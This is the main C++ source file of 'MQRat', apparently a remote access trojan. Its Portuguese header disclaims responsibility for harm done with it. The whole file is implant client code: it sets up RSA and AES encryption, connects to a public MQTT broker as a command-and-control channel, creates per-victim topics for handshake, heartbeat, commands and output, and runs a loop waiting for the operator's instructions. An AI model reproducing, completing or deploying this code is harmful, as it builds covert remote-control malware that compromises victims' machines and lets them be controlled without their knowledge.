/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#ifndef __cplusplus
#error "We need a C++ compiler"
#endif

#include <thread>
#include <string>
#include <functional>
#include <csignal>
#include "mqtt_client.hpp"
#include "log.hpp"
#include "utils.hpp"
#include "network.hpp"
#include "rsa.hpp"
#include "aes.hpp"

using namespace std;

void sigsegv_handler(int s) {
	Log::LogPanic("Segmentation fault detected");
}

int main() {
	unsigned QoS = 0;
	MqttClient *client = nullptr;
	Crypto::RSACipher *cipher = nullptr;
	Crypto::AESCipher *aes_cipher = nullptr;

	// Setup signal handler
	signal(SIGSEGV, sigsegv_handler);

	// Setup ciphers
	try {
		cipher = new Crypto::RSACipher();
		aes_cipher = new Crypto::AESCipher(Crypto::AES256);
	} catch(std::bad_alloc& ba) {
		Log::LogPanic("Failed to allocate memory: %s", ba.what());
	}

	if(!cipher || !aes_cipher) {
		Log::LogPanic("Failed to allocate memory for RSA Cipher object");
	}

	// Setup symetric cipher
	aes_cipher->Setup();

	// Generate MQTT client ID
	const auto id = Utils::GenerateID();

	client = new MqttClient(QoS, "tcp://broker.hivemq.com:1883", cipher, id);
	if(!client) {
		Log::LogPanic("Failed to initialize MQTT client");
	}

    // Configure MQTT client
    client->Setup();
	
	// Associate symetric cipher with mqtt client
	client->setSymetricCipher(aes_cipher);

	// Generate topic names
	auto heartbeat_topic = topics[MQTT_TOPIC_BASE].Name + "/" + id;
	auto recv_topic = heartbeat_topic + "/" + topics[MQTT_TOPIC_INPUT].Name;
	auto send_topic = heartbeat_topic + "/" + topics[MQTT_TOPIC_OUTPUT].Name;
	auto handshake_topic = heartbeat_topic + "/" + topics[MQTT_TOPIC_HANDSHAKE].Name;

	client->setRecvTopic(recv_topic);
	client->setSendTopic(send_topic);
	client->setHeartbeatTopic(heartbeat_topic);
	client->setHandshakeTopic(handshake_topic);

	Log::LogInfo("Handshake topic: " + handshake_topic);
	Log::LogInfo("Heartbeat topic: " + heartbeat_topic);
	Log::LogInfo("Send topic: " + send_topic);
	Log::LogInfo("Recv topic: " + recv_topic);

	// Connect to broker
	client->Connect();

	// Subscribe to multiple topics
	auto hs_topic = const_cast<char*>(handshake_topic.c_str());
	auto rc_topic = const_cast<char*>(recv_topic.c_str());
	char *const tps[] = { hs_topic, rc_topic };
	char *const *topics = tps;
	int qos[2] = { 0, 0 };

	printf("[INFO] Subscribing to %d topics\n", arraySize(qos));

	client->Subscribe(topics, qos, arraySize(qos));

	// Asks the server to send the RSA key
	client->SendHeartbeat();

	// Wait heartbeat to be responded
	std::thread hb_check_thread(&MqttClient::CheckHandshake, client);
	hb_check_thread.join();

	// Internal loop
	std::thread mqtt_thread(&MqttClient::Loop, client);
	Log::LogInfo("Started MQTT client thread");

	mqtt_thread.join();

	// Free resources
	delete cipher;

    return 0;
}
